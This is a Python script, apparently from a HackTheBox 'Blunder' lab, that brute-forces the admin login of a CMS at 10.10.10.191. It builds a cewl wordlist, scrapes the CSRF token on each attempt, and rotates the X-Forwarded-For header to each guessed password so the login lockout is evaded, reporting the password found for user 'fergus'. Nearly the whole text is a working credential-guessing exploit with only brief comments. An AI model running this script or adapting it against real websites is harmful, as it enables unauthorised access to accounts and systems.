import re
import requests


login_url = 'http://10.10.10.191/admin/login'

# CEWL
# cewl -w passwordlist.txt -d 10 -m 1 "http://ip_address" 
password = '/home/kali/Desktop/HackTheBox/Blunder/passwordlist.txt' # Created with cewl 


with open(password) as f:
	passwd = f.readlines()
	passwd_list = [x.strip() for x in passwd]
	
wordlist = passwd_list

for password in wordlist:
	session = requests.session() # Create a session 
	login_page = session.get(login_url) # Get a login page session
	crf_token = re.search(r'name="tokenCSRF"\svalue="(.+?)"', login_page.text).group(1) # Get token value in source code.
	print('Trying pw : ' + str(password))

	headers = {
		'X-Forwarded-For' : password,
		'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
		'Referer' : login_url
	}
		
	data = {
		'tokenCSRF' : crf_token,
		'username' : 'fergus',
		'password' :  password,
		'save' : ''
	}
	
	login_result = session.post(login_url, headers=headers, data=data, allow_redirects=False)
	
	print(str(login_result.headers['Connection']) + '\n')
	
	if login_result.headers['Connection'] != 'close':
		print('\n\nUsername : \'fergus\' - Password : {} \n'.format(password))
		break
	
		
		

	


	
